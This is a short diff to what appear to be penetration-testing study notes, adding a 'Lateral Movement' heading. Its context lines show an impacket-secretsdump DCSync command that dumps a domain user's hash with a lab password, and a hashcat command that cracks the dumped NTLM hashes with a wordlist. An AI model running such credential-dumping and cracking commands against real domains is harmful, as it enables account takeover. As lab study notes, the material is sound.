@@ -377,6 +377,8 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 ```
 hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+---
+# Lateral Movement
 
 
 
